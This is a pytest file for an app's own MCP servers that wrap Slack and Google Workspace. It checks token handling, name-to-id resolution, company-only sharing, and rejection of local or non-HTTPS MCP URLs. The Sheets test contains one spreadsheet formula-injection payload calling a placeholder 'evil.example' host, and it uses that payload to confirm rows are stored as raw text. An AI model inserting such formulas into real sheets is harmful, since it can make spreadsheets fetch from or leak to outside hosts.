"""Handbook's own MCP servers for Slack and Google (``app/mcphost``): the MCP
handshake, the person's token as the only credential, names resolved to ids,
and Sheets written RAW. Offline: the vendors' APIs are faked."""

from __future__ import annotations

import json

import pytest

from app.mcphost import google, slack


@pytest.fixture
def client(monkeypatch):
    from fastapi.testclient import TestClient

    from app.api.main import create_app

    monkeypatch.setenv("AUTH_JWT_SECRET", "test-jwt-secret-do-not-use-in-prod")
    return TestClient(create_app())


def _rpc(client, name, method, params=None, token=None, rid=1):
    headers = {"Authorization": f"Bearer {token}"} if token else {}
    body = {"jsonrpc": "2.0", "method": method, "params": params or {}}
    if rid is not None:
        body["id"] = rid
    return client.post(f"/mcp/{name}", json=body, headers=headers)


def test_it_answers_like_an_mcp_server_and_lists_without_a_sign_in(client):
    init = _rpc(client, "slack", "initialize").json()["result"]
    assert init["serverInfo"]["name"] == "handbook-slack" and "tools" in init["capabilities"]
    assert _rpc(client, "slack", "notifications/initialized", rid=None).status_code == 202
    tools = {t["name"]: t for t in _rpc(client, "google", "tools/list").json()["result"]["tools"]}
    assert tools["add_rows"]["annotations"]["readOnlyHint"] is False
    assert tools["search_files"]["annotations"]["readOnlyHint"] is True
    assert _rpc(client, "nope", "tools/list").status_code == 404


def test_a_call_needs_the_persons_token(client):
    r = _rpc(client, "slack", "tools/call", {"name": "send_message", "arguments": {"channel": "#g", "text": "hi"}})
    assert r.status_code == 401


class SlackFake:
    def __init__(self, error=None):
        self.calls, self.error = [], error

    def post(self, url, headers=None, data=None, timeout=None):
        method = url.rsplit("/", 1)[-1]
        self.calls.append((method, headers["Authorization"], data))
        body = {"ok": False, "error": self.error} if self.error else {
            "users.conversations": {"ok": True, "channels": [{"id": "C0HBTEST01", "name": "hb-testing"}]},
            "conversations.list": {"ok": True, "channels": [{"id": "C0GENERAL1", "name": "general"}]},
            "chat.postMessage": {"ok": True, "ts": "171.5"},
            "chat.getPermalink": {"ok": True, "permalink": "https://acme.slack.com/archives/C0GENERAL1/p1715"},
            "users.lookupByEmail": {"ok": True, "user": {"id": "U0PRIYA001", "real_name": "Priya"}},
            "conversations.open": {"ok": True, "channel": {"id": "D0DM000001"}},
        }[method]
        return type("R", (), {"json": lambda self: body})()


def test_a_slack_post_goes_as_the_person_to_the_channel_they_named(client, monkeypatch):
    fake = SlackFake()
    monkeypatch.setattr(slack.httpx, "post", fake.post)
    r = _rpc(client, "slack", "tools/call", {"name": "send_message",
                                              "arguments": {"channel": "#general", "text": "Ships Friday"}},
             token="xoxp-person").json()["result"]
    assert r["structuredContent"]["url"].startswith("https://acme.slack.com/")
    post = next(c for c in fake.calls if c[0] == "chat.postMessage")
    assert post[1] == "Bearer xoxp-person" and post[2]["channel"] == "C0GENERAL1"
    blocks = json.loads(post[2]["blocks"])       # the words as approved, then "Sent with Handbook"
    assert post[2]["text"] == "Ships Friday" and blocks[0]["text"]["text"] == "Ships Friday"
    assert blocks[-1] == {"type": "context", "elements": [{"type": "mrkdwn", "text": "Sent with Handbook"}]}
    _rpc(client, "slack", "tools/call", {"name": "send_message", "arguments": {"channel": "#hb-testing", "text": "x"}},
         token="xoxp-person")       # a channel they are in is found first, without the full walk
    assert [c[2]["channel"] for c in fake.calls if c[0] == "chat.postMessage"][-1] == "C0HBTEST01"

    _rpc(client, "slack", "tools/call", {"name": "send_dm", "arguments": {"person": "priya@acme.com", "text": "hi"}},
         token="xoxp-person")
    assert [c[2].get("channel") for c in fake.calls if c[0] == "chat.postMessage"][-1] == "D0DM000001"


def test_an_unknown_channel_is_said_and_a_dead_sign_in_is_401(client, monkeypatch):
    monkeypatch.setattr(slack.httpx, "post", SlackFake().post)
    r = _rpc(client, "slack", "tools/call", {"name": "send_message", "arguments": {"channel": "#nope", "text": "x"}},
             token="t").json()["result"]
    assert r["isError"] and "no channel named #nope" in r["content"][0]["text"]
    monkeypatch.setattr(slack.httpx, "post", SlackFake(error="invalid_auth").post)
    assert _rpc(client, "slack", "tools/call", {"name": "list_channels", "arguments": {}}, token="t").status_code == 401


class GoogleFake:
    def __init__(self):
        self.calls = []

    def request(self, method, url, headers=None, timeout=None, params=None, json=None):
        self.calls.append((method, url, params or {}, json))
        if url == google.DRIVE:
            body = {"files": [{"id": "S" * 30, "name": "MCP test sheet", "mimeType": google.SHEET_TYPE,
                               "webViewLink": "https://docs.google.com/spreadsheets/d/x"}]}
        elif url == google.DOCS:
            body = {"documentId": "D" * 30, "title": json["title"]}
        else:
            body = {}
        return type("R", (), {"status_code": 200, "content": b"{}", "json": lambda self: body})()


def test_rows_go_to_the_sheet_named_and_are_written_raw_never_as_formulas(client, monkeypatch):
    fake = GoogleFake()
    monkeypatch.setattr(google.httpx, "request", fake.request)
    rows = [["=IMPORTDATA(\"https://evil.example\")", "passed"]]
    r = _rpc(client, "google", "tools/call", {"name": "add_rows",
                                               "arguments": {"spreadsheet": "MCP test sheet", "rows": rows}},
             token="ya29.person").json()["result"]
    assert not r.get("isError") and "Added 1 row" in r["content"][0]["text"]
    method, url, params, body = fake.calls[-1]
    assert url.endswith(":append") and ("S" * 30) in url
    assert params["valueInputOption"] == "RAW" and body == {"values": rows}
    search = fake.calls[0][2]["q"]
    assert "name = 'MCP test sheet'" in search and google.SHEET_TYPE in search


def test_a_doc_is_created_with_its_text(client, monkeypatch):
    fake = GoogleFake()
    monkeypatch.setattr(google.httpx, "request", fake.request)
    r = _rpc(client, "google", "tools/call", {"name": "create_doc",
                                               "arguments": {"title": "Notes", "content": "1) ship"}},
             token="ya29.person").json()["result"]
    assert r["structuredContent"]["url"] == f"https://docs.google.com/document/d/{'D' * 30}/edit"
    assert fake.calls[-1][3] == {"requests": [{"insertText": {"location": {"index": 1}, "text": "1) ship"}}]}
    assert json.dumps(r)


def test_agent_modes_own_client_lists_and_calls_the_hosted_server(client, monkeypatch):
    """The same McpSession every preset uses, against /mcp/slack (a local address
    is trusted only because it is Handbook's own configured one)."""
    from app.actions import mcp_client

    monkeypatch.setenv("HANDBOOK_MCP_URL", "http://localhost:3000/api/mcp")
    slack_api = SlackFake()

    def post(url, json=None, headers=None, data=None, timeout=None, **_):   # one httpx module for both
        if url.startswith("http://localhost:3000/api"):
            return client.post(url.replace("http://localhost:3000/api", ""), json=json, headers=headers)
        return slack_api.post(url, headers=headers, data=data, timeout=timeout)

    monkeypatch.setattr(mcp_client.httpx, "post", post)
    session = mcp_client.McpSession("http://localhost:3000/api/mcp/slack", "xoxp-person")
    session.open()
    tools, cut = session.list_tools()
    assert {t["name"] for t in tools} >= {"send_message", "send_dm"} and not cut
    result = session.call_tool("send_message", {"channel": "#general", "text": "hi"}, write=True)
    assert result["structuredContent"]["url"].startswith("https://acme.slack.com/")
    with pytest.raises(Exception, match="public internet|https"):
        mcp_client.public_https("http://localhost:9999/elsewhere")


class GoogleEdits(GoogleFake):
    """Answers the edits the newer tools make."""

    def request(self, method, url, headers=None, timeout=None, params=None, json=None):
        if url.endswith(":batchUpdate") and "replaceAllText" in str(json):
            self.calls.append((method, url, params or {}, json))
            changed = 2 if json["requests"][0]["replaceAllText"]["containsText"]["text"] == "v1" else 0
            body = {"replies": [{"replaceAllText": {"occurrencesChanged": changed}}]}
            return type("R", (), {"status_code": 200, "content": b"{}", "json": lambda self: body})()
        return super().request(method, url, headers=headers, timeout=timeout, params=params, json=json)


def _call(client, name, arguments):
    return _rpc(client, "google", "tools/call", {"name": name, "arguments": arguments},
                token="ya29.person").json()["result"]


def test_text_is_added_to_the_end_of_a_doc_and_replaced_only_where_it_is(client, monkeypatch):
    fake = GoogleEdits()
    monkeypatch.setattr(google.httpx, "request", fake.request)
    r = _call(client, "append_to_doc", {"doc": "MCP test sheet", "text": "Next steps"})
    assert not r.get("isError")
    assert fake.calls[-1][3] == {"requests": [{"insertText": {"endOfSegmentLocation": {}, "text": "\nNext steps"}}]}
    assert "Replaced 2 places" in _call(client, "replace_in_doc", {"doc": "x", "find": "v1", "replace": "v2"})[
        "content"][0]["text"]
    missing = _call(client, "replace_in_doc", {"doc": "x", "find": "nowhere", "replace": "v2"})
    assert missing.get("isError") and "no text" in missing["content"][0]["text"]


def test_a_file_moves_into_a_folder_and_is_shared_only_in_a_role_drive_has(client, monkeypatch):
    fake = GoogleEdits()
    monkeypatch.setattr(google.httpx, "request", fake.request)
    assert not _call(client, "move_file", {"file": "MCP test sheet", "folder": "Team"}).get("isError")
    patch = [c for c in fake.calls if c[0] == "PATCH"][-1]
    assert patch[2]["addParents"] == "S" * 30           # the folder the name resolved to
    shared = _call(client, "share_file", {"file": "MCP test sheet", "person": "raj@acme.com", "role": "editor"})
    assert not shared.get("isError") and fake.calls[-1][3] == {
        "type": "user", "role": "writer", "emailAddress": "raj@acme.com"}
    owner = _call(client, "share_file", {"file": "MCP test sheet", "person": "raj@acme.com", "role": "owner"})
    assert owner.get("isError")                          # ownership is never handed over


def test_a_file_is_shared_only_with_someone_in_the_company(monkeypatch):
    from app.actions import mcp_presets
    from app.core.exceptions import ActionRejected

    members = {"raj@acme.com"}
    monkeypatch.setattr("app.auth.users.get_member_by_address",
                        lambda email, org: object() if email.lower() in members else None)
    mcp_presets.GOOGLE_WORKSPACE.target_check("org", {"file": "Plan", "person": "Raj@acme.com"})
    with pytest.raises(ActionRejected, match="isn't in your company"):
        mcp_presets.GOOGLE_WORKSPACE.target_check("org", {"file": "Plan", "person": "someone@gmail.com"})
    mcp_presets.GOOGLE_WORKSPACE.target_check("org", {"title": "New doc"})       # not a share: nothing to check


def test_a_doc_is_created_inside_the_folder_named(client, monkeypatch):
    """"Create a folder Q4 and a Doc Plan inside it": the Doc is moved into
    the folder from My Drive; without a folder nothing is moved."""
    fake = GoogleEdits()
    monkeypatch.setattr(google.httpx, "request", fake.request)
    r = _call(client, "create_doc", {"title": "Plan", "content": "1) ship", "folder": "Q4"})
    assert not r.get("isError") and "in the folder" in r["content"][0]["text"]
    patch = [c for c in fake.calls if c[0] == "PATCH"][-1]
    assert ("D" * 30) in patch[1] and patch[2]["addParents"] == "S" * 30
    folder_search = [c for c in fake.calls if c[1] == google.DRIVE and c[0] == "GET"][-1][2]["q"]
    assert google.FOLDER_TYPE in folder_search and "name = 'Q4'" in folder_search
    fake.calls.clear()
    _call(client, "create_doc", {"title": "Loose", "content": "x"})
    assert not [c for c in fake.calls if c[0] == "PATCH"]


def test_a_write_says_the_name_of_the_file_it_acted_on(client, monkeypatch):
    fake = GoogleEdits()
    monkeypatch.setattr(google.httpx, "request", fake.request)
    r = _call(client, "append_to_doc", {"doc": "MCP test sheet", "text": "x"})
    assert r["structuredContent"]["name"] == "MCP test sheet" and r["structuredContent"]["id"] == "S" * 30
